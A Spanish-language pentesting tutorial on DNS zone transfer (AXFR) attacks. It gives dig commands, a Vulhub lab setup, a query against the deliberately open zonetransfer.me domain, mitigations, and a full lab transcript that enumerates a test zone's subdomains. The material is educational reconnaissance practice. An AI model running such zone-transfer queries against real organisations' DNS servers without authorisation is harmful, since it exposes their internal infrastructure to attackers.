# Ataques de Transferencia de Zona (AXFR – Full Zone Transfer)

En nuestra formación en ciberseguridad ofensiva, uno de los ataques que debemos entender y practicar es el **ataque de transferencia de zona**, también conocido como **AXFR**. Este tipo de ataque se dirige a los servidores DNS (Domain Name System) con el objetivo de extraer información sensible sobre la infraestructura de una organización.

## ¿Qué es un ataque AXFR?

Los servidores DNS son los encargados de traducir nombres de dominio como `ejemplo.com` a direcciones IP como `192.168.1.10`, que son las que utilizan los dispositivos para comunicarse entre sí. En una red, puede haber múltiples registros DNS: registros A (dirección IP), MX (servidores de correo), NS (nombres de servidores), TXT (políticas de seguridad), entre otros.

El protocolo AXFR fue diseñado para permitir la **sincronización de zonas DNS** entre servidores primarios y secundarios. Sin embargo, si no se configura correctamente, este mecanismo puede ser abusado por un atacante para obtener **una copia completa de los registros DNS de un dominio**.

Un atacante puede aprovechar esto simplemente ejecutando una consulta AXFR hacia el servidor DNS objetivo. Si no hay restricciones, el servidor responderá con todos los registros de la zona, exponiendo datos valiosos.

## ¿Cómo se realiza una prueba con `dig`?

Utilizamos la herramienta `dig`, muy común en entornos Unix/Linux, para realizar pruebas de transferencia de zona.

```bash
dig @<IP-del-servidor-DNS> <dominio> AXFR
````

Por ejemplo:

```bash
dig @192.168.1.100 ejemplo.com AXFR
```

Si el servidor no está protegido adecuadamente, nos devolverá todos los registros DNS de `ejemplo.com`.

## Ejemplo práctico (entorno controlado)

Para practicar este ataque de forma legal y controlada, usamos el entorno vulnerable proporcionado por el repositorio **DNS-Zone-Transfer** de Vulhub:

Repositorio: [https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer](https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer)

Pasos:

1. Clonamos el repositorio:
    
    ```bash
    git clone https://github.com/vulhub/vulhub.git
    cd vulhub/dns/dns-zone-transfer
    ```
    
2. Levantamos el entorno vulnerable:
    
    ```bash
    docker-compose up -d
    ```
    
3. Ejecutamos el ataque desde otro terminal:
    
    ```bash
    dig @127.0.0.1 zonetransfer.me AXFR
    ```
    
    La respuesta incluirá todos los registros DNS definidos en esa zona de prueba, demostrando la viabilidad del ataque si no se filtra correctamente el acceso AXFR.
    

## Ejemplo real

Un caso conocido es el dominio `zonetransfer.me`, mantenido por un investigador de seguridad con el objetivo específico de permitir a estudiantes y pentesters practicar transferencias de zona sin infringir ninguna norma legal.

```bash
dig @nsztm1.digi.ninja zonetransfer.me AXFR
```

Este dominio fue configurado intencionalmente para responder a consultas AXFR. Como resultado, podemos ver registros reales como:

- `mail.zonetransfer.me. 3600 IN A 5.196.105.14`
    
- `office.zonetransfer.me. 3600 IN A 4.23.39.254`
    
- `@ IN MX 0 mail.zonetransfer.me.`
    

Este ejemplo real demuestra el tipo de información que un atacante podría explotar si una organización deja abierto este tipo de transferencia.

## Mitigaciones

Para prevenir este tipo de ataques:

- Configuramos los servidores DNS para aceptar transferencias de zona **solo desde direcciones IP autorizadas**.
    
- Usamos técnicas de autenticación segura (como TSIG) para validar los servidores secundarios.
    
- Desactivamos la transferencia de zona si no es necesaria.
    
- Implementamos sistemas de monitoreo DNS que alerten ante solicitudes de AXFR no autorizadas.
    

## Conclusión

Los ataques de transferencia de zona representan una de las formas más sencillas de obtener inteligencia de una red si los servidores DNS no están debidamente configurados. Aprender a identificarlos, explotarlos en entornos de prueba y aplicar las mitigaciones adecuadas es fundamental en nuestro camino hacia convertirnos en profesionales del pentesting y del red teaming.

---

Acción: obtener toda la información de la zona y ver los subdominios

```bash
dig AXFR @127.0.0.1 vulhub.org -p 8081
```

**Nota:** es importante saber previamente el dominio y la ip para poder apuntar hacia su zona de transferencia

Resultado:

```bash
; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> AXFR @127.0.0.1 vulhub.org -p 8081
; (1 server found)
;; global options: +cmd
vulhub.org.		3600	IN	SOA	ns.vulhub.org. sa.vulhub.org. 1 3600 600 86400 3600
vulhub.org.		3600	IN	NS	ns1.vulhub.org.
vulhub.org.		3600	IN	NS	ns2.vulhub.org.
admin.vulhub.org.	3600	IN	A	10.1.1.4
cdn.vulhub.org.		3600	IN	A	10.1.1.3
git.vulhub.org.		3600	IN	A	10.1.1.4
ns1.vulhub.org.		3600	IN	A	10.0.0.1
ns2.vulhub.org.		3600	IN	A	10.0.0.2
sa.vulhub.org.		3600	IN	A	10.1.1.2
static.vulhub.org.	3600	IN	CNAME	www.vulhub.org.
wap.vulhub.org.		3600	IN	CNAME	www.vulhub.org.
www.vulhub.org.		3600	IN	A	10.1.1.1
vulhub.org.		3600	IN	SOA	ns.vulhub.org. sa.vulhub.org. 1 3600 600 86400 3600
;; Query time: 13 msec
;; SERVER: 127.0.0.1#8081(127.0.0.1) (TCP)
;; WHEN: Tue Jun 10 16:10:42 CEST 2025
;; XFR size: 13 records (messages 1, bytes 322)
```

